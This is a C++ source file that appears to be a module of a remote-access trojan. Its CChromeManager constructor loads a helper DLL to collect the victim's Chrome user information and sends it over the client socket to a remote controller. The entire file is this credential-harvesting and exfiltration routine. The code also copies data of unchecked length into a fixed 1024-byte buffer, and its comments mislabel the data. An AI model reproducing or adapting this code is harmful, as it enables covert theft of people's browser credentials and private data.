#include "../StdAfx.h"
#include "ChromeManager.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CChromeManager::CChromeManager(CClientSocket *pClient) : CManager(pClient)
{
	//TOKEN_CHROME_INFO
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024); //暂时分配一下缓冲区
	lpBuffer[0] = TOKEN_CHROME_INFO;
	dwOffset = 1;

	HMODULE hDll = ::LoadLibrary("CHROMEUSERINFO.dll");
	if (hDll)
	{
		fnGetChromeUserInfo = (PfnGetChromeUserInfo)GetProcAddress(hDll, "fnGetChromeUserInfo");
		fnDeleteChromeUserInfo = (PfnDeleteChromeUserInfo)GetProcAddress(hDll, "fnDeleteChromeUserInfo");
		if (fnGetChromeUserInfo && fnDeleteChromeUserInfo)
		{
			char *pData = NULL;
			int iLen = 0;
			int iRet = fnGetChromeUserInfo(pData, iLen);
			if (CHROME_SUCCESS == iRet)
			{
				
				m_gFunc.memcpy(lpBuffer + dwOffset, pData, iLen + 1); // 进程名
				dwOffset += iLen;
				if (pData)
				{
					fnDeleteChromeUserInfo(pData);
				}

			}
			else if (CHROME_NO_DATA == iRet)
			{
				m_gFunc.memcpy(lpBuffer + dwOffset, "CHROME_NO_DATA", m_gFunc.strlen("CHROME_NO_DATA") + 1); // 进程名
				dwOffset += m_gFunc.strlen("CHROME_NO_DATA") + 1;
			}
			else
			{
				m_gFunc.memcpy(lpBuffer + dwOffset, "CHROME_UNKNOW", m_gFunc.strlen("CHROME_UNKNOW") + 1); // 进程名
				dwOffset += m_gFunc.strlen("CHROME_UNKNOW") + 1;
			}

		}
		else
		{
			m_gFunc.memcpy(lpBuffer + dwOffset, "CHROME_UNKNOW", m_gFunc.strlen("CHROME_UNKNOW") + 1); // 进程名
			dwOffset += m_gFunc.strlen("CHROME_UNKNOW") + 1;
		}
	}
	else
	{
		m_gFunc.memcpy(lpBuffer + dwOffset, "CHROME_UNKNOW", m_gFunc.strlen("CHROME_UNKNOW") + 1); // 进程名
		dwOffset += m_gFunc.strlen("CHROME_UNKNOW") + 1;
	}

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

CChromeManager::~CChromeManager()
{
}